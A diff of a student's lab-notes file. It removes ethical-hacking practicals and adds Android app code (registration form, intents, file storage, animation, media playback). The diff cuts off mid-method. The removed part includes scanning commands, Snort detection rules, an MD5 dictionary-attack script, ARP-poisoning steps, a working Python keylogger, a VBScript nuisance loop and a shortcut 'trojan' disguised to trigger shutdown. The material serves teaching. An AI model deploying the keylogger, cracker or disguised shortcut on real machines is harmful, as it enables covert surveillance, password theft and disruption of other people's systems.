@@ -1,765 +1,2945 @@
-## Practical 3 — Port & Network Scanning, Snort, Wireshark
-
-### A. Port Scanning (Nmap)
-
-* Scan open ports:
-
-  ```
-  nmap --open 127.0.0.1
-  ```
-* Scan single port:
-
-  ```
-  nmap -p 80 127.0.0.1
-  ```
-* Scan a range of ports:
-
-  ```
-  nmap -p 1-200 127.0.0.1
-  ```
-* Scan entire port range:
-
-  ```
-  nmap -p 1-65535 127.0.0.1
-  ```
-* Fast scan (top 100):
-
-  ```
-  nmap -F 127.0.0.1
-  ```
-
-### B. Network Scanning (Nmap)
-
-* Ping scan (list live hosts):
-
-  ```
-  nmap -sn 192.168.1.0
-  ```
-* ARP / host scan:
-
-  ```
-  nmap -sP 192.168.1.0/24
-  ```
-* DNS resolution:
-
-  ```
-  nmap -sL 192.168.1.0
-  ```
-* OS detection:
-
-  ```
-  nmap -O 192.168.1.0
-  ```
-* Extra commands:
-
-  ```
-  nmap -iL filename.txt
-  nmap -A 192.168.1.0
-  nmap --traceroute 8.8.8.8
-  ```
-
-### C. Snort (IDS)
-
-* Verify version:
-
-  ```
-  snort -V
-  ```
-* List adapters:
-
-  ```
-  snort -W
-  ```
-* Run (sniffer):
-
-  ```
-  snort -i 6 -A console
-  ```
-* Run with config:
-
-  ```
-  snort -c C:\Snort\etc\snort.conf -i 6 -A console
-  ```
-
-**Example `snort.conf` snippet** (Windows local testing):
-
-```
-ipvar HOME_NET 10.119.154.0/24
-ipvar EXTERNAL_NET any
-var RULE_PATH C:\Snort\rules
-var LOG_PATH C:\Snort\log
-preprocessor frag3_global: max_frags 65536
-preprocessor frag3_engine: policy windows
-preprocessor stream5_global: track_tcp yes
-preprocessor stream5_tcp: policy windows
-output alert_fast: alert.fast
-include $RULE_PATH/local.rules
-```
-
-**local.rules examples:**
-
-```
-alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001;)
-alert tcp any any -> any 80 (msg:"HTTP Traffic Detected"; flow:to_server,established; sid:1000002;)
-alert tcp any any -> any any (flags:S; msg:"TCP SYN Scan Detected"; threshold:type both, track by_src, count 5, seconds 60; sid:1000003;)
-```
-
-**Test commands:**
-
-```
-ping 10.1.5.85
-nmap -sS 10.1.5.85
-```
-
-### D. Wireshark (Packet capture)
-
-* Capture filter example:
-
-  ```
-  tcp port 80
-  ```
-* Display filters:
-
-  ```
-  ip.src == 192.168.1.5
-  http
-  icmp
-  tcp.flags.syn == 1
-  ```
-* Steps: Start capture → generate traffic (e.g., visit `http://www.techpanda.org`) → stop capture → inspect POST/HTTP packets.
-
----
-
-## Practical 4 — Password Cracking, Dictionary Attack, DoS, ARP, Tools
-
-### A. Password Cracking
-
-* MD5 generator: use [https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/)
-
-  * `Admin12345` → `e66055e8e308770492a44bf16e875127`
-  * `Ethical@#$%Hacking` → `698543190dc248f71d96e5a4f1dd0bd2`
-* CrackStation: [https://crackstation.net/](https://crackstation.net/)
-
-### B. Dictionary Attack (Python)
-
-* Script (`dictattack.py`):
-
-  ```python
-  import hashlib
-  flag = 0
-  p_hash = input("Enter MD5 hash: ")
-  dictionary = input("Enter dictionary filename: ")
-  try:
-      password_file = open(dictionary, "r")
-  except FileNotFoundError:
-      print("No file found")
-      quit()
-  for word in password_file:
-      enc_word = word.strip().encode('utf-8')
-      digest = hashlib.md5(enc_word).hexdigest()
-      if digest == p_hash:
-          print("Password has been found")
-          print("Password is:", word.strip())
-          flag = 1
-          break
-  if flag == 0:
-      print("No password found")
-  ```
-* Run:
-
-  ```
-  python dictattack.py
-  ```
-
-### C. Encrypt / Decrypt Passwords (online)
-
-* DNSChecker: [https://dnschecker.org/password-encryption-utility.php](https://dnschecker.org/password-encryption-utility.php)
-* Hashes.com: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
-
-### D. DoS (theory)
-
-* Ping of Death, SYN flood, Smurf — no active commands provided (explain only).
-
-### E. ARP Poisoning (Cain & Abel workflow)
-
-* GUI steps: Sniffer → select interface → scan hosts → APR tab → pair victim + gateway → start poisoning → capture.
-
-### F. Network commands
-
-```
-ipconfig
-ipconfig /all
-ping google.com
-tracert google.com
-netstat -an
-```
-
-### G. Steganography (S-Tools)
-
-* Use S-Tools GUI: hide `ME.txt` inside `img1.bmp` → produce `hidden data.bmp` → reveal by entering password.
-
----
-
-## Practical 5 — Keylogger, Virus, Trojan (Windows)
-
-### A. Keylogger (Python)
-
-* Install:
-
-  ```
-  pip install pynput
-  ```
-* Keylogger code (writes to `keyLog.txt`):
-
-  ```python
-  from pynput.keyboard import Key, Listener
-  import logging
-  import os
-  log_dir = r"E:/Users/mca24106/Downloads/Keylogger"
-  log_path = os.path.join(log_dir, "keyLog.txt")
-  logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-  def on_press(key):
-      logging.info(str(key))
-  with Listener(on_press=on_press) as listener:
-      listener.join()
-  ```
-
-> **Ethical note:** Keyloggers and malware code are provided for educational understanding only. Do not deploy on systems without explicit, lawful permission.
-
-### B. Simple message virus (example VBScript loop)
-
-```vbscript
-set x=wscript.createobject("wscript.shell")
-do
-  wscript.sleep 100
-  x.sendkeys"{CAPSLOCK}"
-  x.sendkeys"{NUMLOCK}"
-  x.sendkeys"I am a Virus"
-  x.sendkeys" {SCROLLLOCK}"
-loop
-```
-
-### C. Trojan via shortcut
-
-* Create shortcut with command:
-
-  ```
-  shutdown -s -t 50 -c "Shutdown the machine"
-  ```
-* Change icon to disguise.
-
----
-
-## Practical 7 — Ceaser Ciphers (CrypTool)
+###### Regi -explicit
 
 ```java
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+ android:background="#FAFAFA"
+ android:layout_width="match_parent"
+ android:layout_height="match_parent">
+ 
+<LinearLayout
+ android:orientation="vertical"
+ android:gravity="center_horizontal"
+ android:padding="24dp"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content">
+
+ <ImageView
+ android:id="@+id/imgProfileMain"
+ android:layout_width="120dp"
+ android:layout_height="120dp"
+ android:src="@android:drawable/ic_menu_camera"
+ android:contentDescription="Profile Image"
+ android:layout_marginBottom="24dp"
+ android:background="@drawable/circle_bg"
+ android:scaleType="centerCrop" />
+
+ <TextView
+ android:id="@+id/tvTitle"
+ android:text="User Registration"
+ android:textSize="28sp"
+ android:textStyle="bold"
+ android:textColor="#3F51B5"
+ android:layout_marginBottom="24dp"
+ android:layout_width="wrap_content"
+ android:layout_height="wrap_content" />
+
+ <EditText
+ android:id="@+id/etName"
+ android:layout_width="match_parent"
+ android:layout_height="48dp"
+ android:background="@drawable/edittext_bg"
+ android:padding="12dp"
+ android:hint="Enter your full name"
+ android:inputType="textPersonName"
+ android:textColor="#212121"
+ android:textSize="16sp" />
+
+ <EditText
+ android:id="@+id/etEmail"
+ android:layout_width="match_parent"
+ android:layout_height="48dp"
+ android:background="@drawable/edittext_bg"
+ android:padding="12dp"
+ android:hint="Enter your email address"
+ android:inputType="textEmailAddress"
+ android:textColor="#212121"
+ android:textSize="16sp"
+ android:layout_marginTop="16dp" />
+
+ <RadioGroup
+ android:id="@+id/rgGender"
+ android:layout_width="wrap_content"
+ android:layout_height="wrap_content"
+ android:orientation="horizontal"
+ android:layout_marginTop="20dp">
+
+ <RadioButton
+ android:id="@+id/rbMale"
+ android:text="Male"
+ android:textColor="#3F51B5"
+ android:textSize="16sp"
+ android:layout_width="wrap_content"
+ android:layout_height="wrap_content" />
+
+ <RadioButton
+ android:id="@+id/rbFemale"
+ android:text="Female"
+ android:textColor="#3F51B5"
+ android:textSize="16sp"
+ android:layout_marginStart="24dp"
+ android:layout_width="wrap_content"
+ android:layout_height="wrap_content" />
+ </RadioGroup>
+
+ <Spinner
+ android:id="@+id/spCountry"
+ android:layout_width="match_parent"
+ android:layout_height="48dp"
+ android:layout_marginTop="20dp"
+ android:background="@drawable/edittext_bg"
+ android:padding="8dp" />
+
+ <Button
+ android:id="@+id/btnDob"
+ android:layout_width="match_parent"
+ android:layout_height="48dp"
+ android:text="Select Date of Birth"
+ android:textColor="#FFFFFF"
+ android:backgroundTint="#3F51B5"
+ android:textSize="16sp"
+ android:layout_marginTop="20dp" />
+
+ <TextView
+ android:id="@+id/tvDob"
+ android:layout_width="match_parent"
+ android:layout_height="wrap_content"
+ android:textColor="#757575"
+ android:textSize="16sp"
+ android:gravity="center"
+ android:layout_marginTop="8dp" />
+
+ <ProgressBar
+ android:id="@+id/pbLoading"
+ android:layout_width="48dp"
+ android:layout_height="48dp"
+ android:layout_marginTop="24dp"
+ android:visibility="gone"
+ android:indeterminateTint="#3F51B5" />
+
+ <Button
+ android:id="@+id/btnSubmit"
+ android:layout_width="match_parent"
+ android:layout_height="48dp"
+ android:text="Submit"
+ android:textColor="#FFFFFF"
+ android:backgroundTint="#00796B"
+ android:textSize="16sp"
+ android:layout_marginTop="24dp" />
+
+ </LinearLayout>
+
+</ScrollView>
+
+Activity_next.xml:
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+ android:orientation="vertical"
+ android:gravity="center"
+ android:padding="24dp"
+ android:background="#FAFAFA"
+ android:layout_width="match_parent"
+ android:layout_height="match_parent">
+
+ <ImageView
+ android:id="@+id/imgProfileNext"
+ android:layout_width="120dp"
+ android:layout_height="120dp"
+ android:src="@android:drawable/ic_menu_camera"
+ android:contentDescription="Profile Image"
+ android:layout_marginBottom="24dp"
+ android:background="@drawable/circle_bg"
+ android:scaleType="centerCrop" />
+
+ <TextView
+ android:id="@+id/tvResult"
+ android:textColor="#222222"
+ android:textSize="20sp"
+ android:lineSpacingExtra="6dp"
+ android:textAlignment="center"
+ android:layout_width="wrap_content"
+ android:layout_height="wrap_content"/>
+
+ <ProgressBar
+ android:id="@+id/pbLoadingNext"
+ android:layout_width="48dp"
+ android:layout_height="48dp"
+ android:visibility="gone"
+ android:layout_marginTop="20dp"
+ android:indeterminateTint="#3F51B5" />
+</LinearLayout>
+
+MainAcitivity.java:
+
+package com.example.registration_form;
+import androidx.appcompat.app.AppCompatActivity;
+import android.app.DatePickerDialog;
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.*;
+import java.util.Calendar;
+
+public class MainActivity extends AppCompatActivity implements DatePickerDialog.OnDateSetListener {
+
+ private EditText etName, etEmail;
+ private RadioGroup rgGender;
+ private Spinner spCountry;
+ private Button btnDob, btnSubmit;
+ private TextView tvDob;
+ private ProgressBar pbLoading;
+ private String selectedGender = "";
+ private String selectedDate = "";
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_main);
+
+ etName = findViewById(R.id.etName);
+ etEmail = findViewById(R.id.etEmail);
+ rgGender = findViewById(R.id.rgGender);
+ spCountry = findViewById(R.id.spCountry);
+ btnDob = findViewById(R.id.btnDob);
+ btnSubmit = findViewById(R.id.btnSubmit);
+ tvDob = findViewById(R.id.tvDob);
+ pbLoading = findViewById(R.id.pbLoading);
+
+ String[] countries = {
+ "Select Country",
+ "United States",
+ "Canada",
+ "United Kingdom",
+ "Australia",
+ "India",
+ "Germany",
+ "France",
+ "Japan"
+ };
+
+ ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
+ android.R.layout.simple_spinner_item, countries);
+ adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
+ spCountry.setAdapter(adapter);
+
+ rgGender.setOnCheckedChangeListener((group, checkedId) -> {
+ RadioButton rb = findViewById(checkedId);
+ if (rb != null) selectedGender = rb.getText().toString();
+ });
+
+ btnDob.setOnClickListener(v -> {
+ Calendar calendar = Calendar.getInstance();
+ DatePickerDialog dpd = new DatePickerDialog(
+ MainActivity.this,
+ MainActivity.this,
+ calendar.get(Calendar.YEAR),
+ calendar.get(Calendar.MONTH),
+ calendar.get(Calendar.DAY_OF_MONTH));
+ dpd.show();
+ });
+
+ btnSubmit.setOnClickListener(v -> {
+ pbLoading.setVisibility(View.VISIBLE);
+
+ String name = etName.getText().toString().trim();
+ String email = etEmail.getText().toString().trim();
+ String country = spCountry.getSelectedItem().toString();
+
+ Intent intent = new Intent(MainActivity.this, NextActivity.class);
+ intent.putExtra("name", name);
+ intent.putExtra("email", email);
+ intent.putExtra("gender", selectedGender);
+ intent.putExtra("country", country);
+ intent.putExtra("dob", selectedDate);
+
+ startActivity(intent);
+
+ pbLoading.setVisibility(View.GONE);
+ });
+ }
+
+ @Override
+ public void onDateSet(DatePicker view, int year, int month, int dayOfMonth) {
+ selectedDate = String.format("%d-%02d-%02d", year, month + 1, dayOfMonth);
+ tvDob.setText("Selected Date: " + selectedDate);
+ }
+}
+
+NextActivity.java:
+package com.example.registration_form;
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.os.Handler;
+import android.view.View;
+import android.widget.ProgressBar;
+import android.widget.TextView;
+
+public class NextActivity extends AppCompatActivity {
+ private TextView tvResult;
+ private ProgressBar pbLoadingNext;
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_next);
+
+ tvResult = findViewById(R.id.tvResult);
+ pbLoadingNext = findViewById(R.id.pbLoadingNext);
+
+ pbLoadingNext.setVisibility(View.VISIBLE);
+ tvResult.setVisibility(View.GONE);
+
+ new Handler().postDelayed(() -> {
+ String name = getIntent().getStringExtra("name");
+ String email = getIntent().getStringExtra("email");
+ String gender = getIntent().getStringExtra("gender");
+ String country = getIntent().getStringExtra("country");
+ String dob = getIntent().getStringExtra("dob");
+
+ String displayText = "User Details\n\n" +
+ "Name: " + (name.isEmpty() ? "N/A" : name) + "\n" +
+ "Email: " + (email.isEmpty() ? "N/A" : email) + "\n" +
+ "Gender: " + (gender.isEmpty() ? "N/A" : gender) + "\n" +
+ "Country: " + (country.equals("Select Country") ? "N/A" : country) + "\n" +
+ "Date of Birth: " + (dob.isEmpty() ? "N/A" : dob);
+
+ tvResult.setText(displayText);
+ pbLoadingNext.setVisibility(View.GONE);
+ tvResult.setVisibility(View.VISIBLE);
+ }, 1500);
+ }
+}
+```
+
+
+###### Implicit
+
+```java
+MainActivity.java
+package com.example.myapplication;
+import androidx.appcompat.app.AppCompatActivity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.widget.Button;
+
+public class MainActivity extends AppCompatActivity {
+ private Button browseButton, dialButton, smsButton, shareButton, emailButton, shareDataButton, buttonOpenSecond;
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_main);
+
+ browseButton = findViewById(R.id.browseButton);
+ dialButton = findViewById(R.id.dialButton);
+ smsButton = findViewById(R.id.smsButton);
+ shareButton = findViewById(R.id.shareButton);
+ emailButton = findViewById(R.id.emailButton);
+ shareDataButton = findViewById(R.id.shareDataButton);
+ buttonOpenSecond = findViewById(R.id.buttonOpenSecond);
+
+ browseButton.setOnClickListener(v -> {
+ String url = "https://www.google.com";
+ Intent browseIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+ startActivity(browseIntent);
+ });
+
+ dialButton.setOnClickListener(v -> {
+ Intent dialIntent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:+913979484100"));
+ startActivity(dialIntent);
+ });
+
+ smsButton.setOnClickListener(v -> {
+ Intent smsIntent = new Intent(Intent.ACTION_SENDTO);
+ smsIntent.setData(Uri.parse("smsto:" + Uri.encode("+913979484100")));
+ smsIntent.putExtra("sms_body", "Lalalalalala");
+ startActivity(smsIntent);
+ });
+
+ shareButton.setOnClickListener(v -> {
+ Intent shareIntent = new Intent(Intent.ACTION_SEND);
+ shareIntent.setType("text/plain");
+ shareIntent.putExtra(Intent.EXTRA_TEXT, "hjejkhekjh");
+ startActivity(Intent.createChooser(shareIntent, "Share via"));
+ });
+
+ emailButton.setOnClickListener(v -> {
+ Intent emailIntent = new Intent(Intent.ACTION_SENDTO);
+ emailIntent.setData(Uri.parse("mailto:hehaho@gmail.com"));
+ emailIntent.putExtra(Intent.EXTRA_SUBJECT, "give placement");
+ emailIntent.putExtra(Intent.EXTRA_TEXT, "10lpa minimum needed!!!!!!!");
+ startActivity(emailIntent);
+ });
+
+ shareDataButton.setOnClickListener(v -> {
+ Intent intent = new Intent(Intent.ACTION_SEND);
+ intent.setType("text/plain");
+ intent.putExtra(Intent.EXTRA_TEXT, "This is the text data to share with other apps!");
+ startActivity(Intent.createChooser(intent, "Share text via"));
+ });
+
+ buttonOpenSecond.setOnClickListener(v -> {
+ Intent intent = new Intent(MainActivity.this, SecondActivity.class);
+ startActivity(intent);
+ });
+ }
+}
+
+SecondActivity.java:
+package com.example.receiverapp;
+import androidx.appcompat.app.AppCompatActivity;
+import android.content.Intent;
+import android.os.Bundle;
+import android.widget.TextView;
+
+public class SecondActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        TextView txtreceive;
+        txtreceive=findViewById(R.id.txtreceive);
+        Intent getintent;
+        getintent=getIntent();
+        String val=getintent.getStringExtra(Intent.EXTRA_TEXT);
+        txtreceive.setText(val);
+    }
+}
+
+AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.ReceiverApp"
+        tools:targetApi="31">
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="text/plain"/>
+            </intent-filter>
+        </activity>
+    </application>
+
+</manifest>
+```
+
+
+###### File Storage(ext & int)
+
+```java
+MainActivity.java:
+package com.example.myapplication;
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.os.Bundle;
+import android.os.Environment;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.util.Scanner;
+import java.io.OutputStreamWriter;
 
-public class CaesarCipher {
-    static Scanner sc = new Scanner(System.in);
-    static BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
+public class MainActivity extends AppCompatActivity {
+ private String storedText;
 
-    public static void main(String[] args) throws IOException {
-        System.out.print("Enter any String: ");
-        String str = br.readLine();
-        System.out.print("Enter the Key (integer): ");
-        int key = sc.nextInt();
-        String encrypted = encrypt(str, key);
-        System.out.println("\nEncrypted String is: " + encrypted);
-        String decrypted = decrypt(encrypted, key);
-        System.out.println("Decrypted String is: " + decrypted);
-    }
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_main);
 
-    static String encrypt(String str, int key) {
-        StringBuilder encrypted = new StringBuilder();
-        int shift = key % 26;
-        for (int i = 0; i < str.length(); i++) {
-            char c = str.charAt(i);
-            if (Character.isUpperCase(c)) {
-                char ch = (char) (c + shift);
-                if (ch > 'Z') ch = (char) (ch - 26);
-                encrypted.append(ch);
-            } else if (Character.isLowerCase(c)) {
-                char ch = (char) (c + shift);
-                if (ch > 'z') ch = (char) (ch - 26);
-                encrypted.append(ch);
-            } else encrypted.append(c);
-        }
-        return encrypted.toString();
-    }
+ EditText editText = findViewById(R.id.editText);
+ TextView textView = findViewById(R.id.textView);
 
-    static String decrypt(String str, int key) {
-        StringBuilder decrypted = new StringBuilder();
-        int shift = key % 26;
-        for (int i = 0; i < str.length(); i++) {
-            char c = str.charAt(i);
-            if (Character.isUpperCase(c)) {
-                char ch = (char) (c - shift);
-                if (ch < 'A') ch = (char) (ch + 26);
-                decrypted.append(ch);
-            } else if (Character.isLowerCase(c)) {
-                char ch = (char) (c - shift);
-                if (ch < 'a') ch = (char) (ch + 26);
-                decrypted.append(ch);
-            } else decrypted.append(c);
-        }
-        return decrypted.toString();
+ Button internalStoreBtn = findViewById(R.id.internalStoreBtn);
+ Button internalLoadBtn = findViewById(R.id.internalLoadBtn);
+ Button externalStoreBtn = findViewById(R.id.externalStoreBtn);
+ Button externalLoadBtn = findViewById(R.id.externalLoadBtn);
+
+ String extStorageState = Environment.getExternalStorageState();
+
+ internalStoreBtn.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ String currentText = editText.getText().toString();
+ try (FileOutputStream fos = openFileOutput("messagefile", MODE_PRIVATE);
+ OutputStreamWriter writer = new OutputStreamWriter(fos)) {
+ writer.write(currentText);
+ writer.flush();
+ Toast.makeText(getApplicationContext(), "Message saved", Toast.LENGTH_LONG).show();
+ editText.setText("");
+ } catch (IOException e) {
+ e.printStackTrace();
+ }
+ }
+ });
+
+ internalLoadBtn.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ try (FileInputStream fis = openFileInput("messagefile");
+ InputStreamReader reader = new InputStreamReader(fis)) {
+
+ char[] buffer = new char[250];
+ int charRead;
+ StringBuilder stringBuilder = new StringBuilder();
+
+ while ((charRead = reader.read(buffer)) > 0) {
+ String data = String.copyValueOf(buffer, 0, charRead);
+ stringBuilder.append(data);
+ }
+ Toast.makeText(getApplicationContext(), "Message read", Toast.LENGTH_LONG).show();
+ textView.setText(stringBuilder.toString());
+ } catch (FileNotFoundException e) {
+ e.printStackTrace();
+ } catch (IOException e) {
+ e.printStackTrace();
+ }
+ }
+ });
+
+ externalStoreBtn.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ if (Environment.MEDIA_MOUNTED.equals(extStorageState)) {
+ File myFile = new File(getExternalFilesDir("mydir"), "sample.txt");
+ String currentText = editText.getText().toString();
+
+ try (FileOutputStream fos = new FileOutputStream(myFile);
+ OutputStreamWriter writer = new OutputStreamWriter(fos)) {
+
+ writer.write(currentText);
+ writer.flush();
+ Toast.makeText(getApplicationContext(), "Message saved to external storage", Toast.LENGTH_LONG).show();
+ editText.setText("");
+ System.out.println(getExternalFilesDir("mydir"));
+ } catch (IOException e) {
+ e.printStackTrace();
+ }
+ }
+ }
+ });
+
+ externalLoadBtn.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ if (Environment.MEDIA_MOUNTED.equals(extStorageState) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(extStorageState)) {
+ File myFile = new File(getExternalFilesDir("mydir"), "sample.txt");
+
+ try (FileInputStream fis = new FileInputStream(myFile);
+ InputStreamReader isr = new InputStreamReader(fis);
+ BufferedReader reader = new BufferedReader(isr)) {
+
+ StringBuilder stringBuilder = new StringBuilder();
+ String line;
+
+ while ((line = reader.readLine()) != null) {
+ stringBuilder.append(line).append("\n");
+ }
+
+ Toast.makeText(getApplicationContext(), "Message read from external storage", Toast.LENGTH_LONG).show();
+ textView.setText(stringBuilder.toString());
+
+ } catch (IOException e) {
+ e.printStackTrace();
+ }
+ }
+ }
+ });
+
+ }
+}
+```
+
+
+###### Animation
+
+```java
+MainAcitivity.java
+package com.example.myapplication;
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Color;
+import android.graphics.ColorMatrix;
+import android.graphics.ColorMatrixColorFilter;
+import android.os.Bundle;
+import android.view.View;
+import android.view.animation.Animation;
+import android.view.animation.AnimationUtils;
+import android.widget.Button;
+import android.widget.ImageView;
+
+public class MainActivity2 extends AppCompatActivity {
+
+ Button btnRotate, btnTranslate, btnScaling,
+ btnFadeIn, btnFadeOut, btnBounce, btnGrey,
+ btnInvert;
+ ImageView imageView;
+ boolean isGrey = false;
+ boolean isInverted = false;
+
+ @Override
+ protected void onCreate(Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_main2);
+
+ imageView = findViewById(R.id.imageView);
+ btnRotate = findViewById(R.id.btnRotate);
+ btnTranslate = findViewById(R.id.btnTranslate);
+ btnScaling = findViewById(R.id.btnScaling);
+ btnFadeIn = findViewById(R.id.btnFadeIn);
+ btnFadeOut = findViewById(R.id.btnFadeOut);
+ btnBounce = findViewById(R.id.btnBounce);
+ btnGrey = findViewById(R.id.btnGrey);
+ btnInvert = findViewById(R.id.btnInvert);
+
+ btnRotate.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation rotate = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.rotate);
+ imageView.startAnimation(rotate);
+ }
+ });
+
+ btnTranslate.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation translate = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.translate);
+ imageView.startAnimation(translate);
+ }
+ });
+
+ btnScaling.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation scale = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.scale);
+ imageView.startAnimation(scale);
+ }
+ });
+
+ btnFadeIn.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation fadeIn = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.fade_in);
+ imageView.startAnimation(fadeIn);
+ }
+ });
+
+ btnFadeOut.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation fadeOut = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.fade_out);
+ imageView.startAnimation(fadeOut);
+ }
+ });
+
+ btnBounce.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Animation bounce = AnimationUtils.loadAnimation(getApplicationContext(),
+ R.anim.bounce);
+ imageView.startAnimation(bounce);
+ }
+ });
+
+ btnGrey.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Bitmap originalBitmap = BitmapFactory.decodeResource(
+ getResources(),R.drawable.killua);
+
+ Bitmap grayscaleBitmap = Bitmap.createBitmap(originalBitmap.getWidth(),
+ originalBitmap.getHeight(),
+ originalBitmap.getConfig());
+
+ if(isGrey){
+ imageView.setImageBitmap(originalBitmap);
+ isGrey = false;
+ }
+
+ else{
+ for(int x = 0; x < originalBitmap.getWidth();x++){
+ for(int y = 0; y < originalBitmap.getHeight();y++){
+ int pixel = originalBitmap.getPixel(x,y);
+ int alpha = Color.alpha(pixel);
+ int gray = (Color.red(pixel) + Color.blue(pixel) + Color.blue(pixel)) / 3;
+ grayscaleBitmap.setPixel(x,y,Color.argb(alpha,gray,gray,gray));
+ }
+ }
+ imageView.setImageBitmap(grayscaleBitmap);
+ isGrey = true;
+ }
+ }
+ });
+
+ btnInvert.setOnClickListener(new View.OnClickListener() {
+ @Override
+ public void onClick(View v) {
+ Bitmap originalBitmap = BitmapFactory.decodeResource(
+ getResources(),R.drawable.killua);
+
+ Bitmap grayscaleBitmap = Bitmap.createBitmap(originalBitmap.getWidth(),
+ originalBitmap.getHeight(),
+ originalBitmap.getConfig());
+
+ if(isGrey){
+ imageView.setImageBitmap(originalBitmap);
+ isGrey = false;
+ }
+
+ else{
+ for(int x = 0; x < originalBitmap.getWidth();x++){
+ for(int y = 0; y < originalBitmap.getHeight();y++){
+ int pixel = originalBitmap.getPixel(x,y);
+ int alpha = Color.alpha(pixel);
+ int red = 255-Color.red(pixel);
+ int blue = 255 - Color.blue(pixel);
+ int green = 255 - Color.green(pixel);
+ grayscaleBitmap.setPixel(x,y,Color.argb(alpha,red,green,blue));
+ }
+ }
+ imageView.setImageBitmap(grayscaleBitmap);
+ isGrey = true;
+ }
+ }
+ });
+
+ }
+}
+```
+
+
+###### audio video
+
+```java
+MainActivity.java
+package com.example.myapplication;
+import androidx.appcompat.app.AppCompatActivity;
+import android.media.MediaPlayer;
+import android.net.Uri;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.MediaController;
+import android.widget.Toast;
+import android.widget.VideoView;
+
+public class MainActivity extends AppCompatActivity {
+    VideoView vv;
+    Button play,pause,stop,vplay;
+    MediaPlayer mp;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        play=findViewById(R.id.play);
+        pause=findViewById(R.id.pause);
+        stop=findViewById(R.id.stop);
+        vplay=findViewById(R.id.vplay);
+        vv=findViewById(R.id.vv);
+
+        play.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if (mp == null) {
+                    mp=MediaPlayer.create(getApplicationContext(),R.raw.sample);
+                    mp.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
+                        @Override
+                        public void onCompletion(MediaPlayer mp) {
+                            mp.release();
+                        }
+                    });
+                    mp.start();
+                    Toast.makeText(getApplicationContext(),"Playing",Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+
+        pause.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if(mp!=null){
+                    mp.pause();
+                    Toast.makeText(getApplicationContext(),"Audio paused",Toast.LENGTH_LONG).show();
+                }
